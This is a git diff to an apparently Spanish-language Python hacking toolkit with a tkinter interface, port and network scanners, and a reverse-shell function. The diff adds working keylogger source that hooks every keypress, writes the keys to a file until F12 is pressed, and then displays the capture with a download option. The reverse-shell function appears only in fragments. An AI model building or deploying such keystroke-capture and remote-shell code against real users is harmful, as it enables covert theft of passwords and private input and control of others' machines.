@@ -2,7 +2,7 @@ import netifaces
 import nmap
 from tkinter import messagebox
 from socket import socket
-from tkinter import messagebox
+import keyboard
 from utils import mostrar_resultado_con_descarga
 
 
@@ -103,6 +103,7 @@ def open_port_scanner(ip, start_port, end_port):
     else:
         messagebox.showinfo("Escaneo de Puertos", f"No se encontraron puertos abiertos en {ip} (puertos {start_port}-{end_port}).")
 
+
 def scan_network(ip_range):
     """
     Escanea la red en busca de dispositivos activos utilizando Nmap.
@@ -162,6 +163,7 @@ def open_network_scan():
     else:
         messagebox.showinfo("Detección de Máquinas", "No se encontraron dispositivos.")
 
+
 def open_reverse_shell(ip):
     """
     Inicia una shell inversa con la IP objetivo.
@@ -206,3 +208,36 @@ def open_reverse_shell(ip):
                 print(respuesta.decode())
     except Exception as e:
         messagebox.showerror("Error", f"Error al conectar con {ip}: {e}")
+
+def keylogger():
+    """
+    Inicia un keylogger que registra las teclas presionadas en un archivo "data.txt".
+    Se detiene al presionar la tecla F12 y muestra los datos capturados en una ventana emergente.
+    """
+    def pressedkey(key):
+        """Función que se ejecuta cada vez que se presiona una tecla."""
+        with open("data.txt", "a") as file:
+            if key.name == "space":
+                file.write(" ")
+            elif key.name == "enter":
+                file.write("\n")
+            else:
+                file.write(key.name)
+
+    # Iniciar el keylogger
+    keyboard.on_press(pressedkey)
+    messagebox.showinfo("Keylogger", "Keylogger iniciado. Presiona 'F12' para detener.")
+
+    # Esperar a que el usuario presione 'F12' para detener el keylogger
+    keyboard.wait("f12")
+
+    # Leer los datos capturados
+    with open("data.txt", "r") as file:
+        datos_capturados = file.read()
+
+    # Mostrar los datos en una ventana emergente con la opción de descargar
+    mostrar_resultado_con_descarga(
+        titulo="Keylogger - Datos Capturados",
+        mensaje=datos_capturados,
+        nombre_archivo="keylogger_data.txt"
+    )
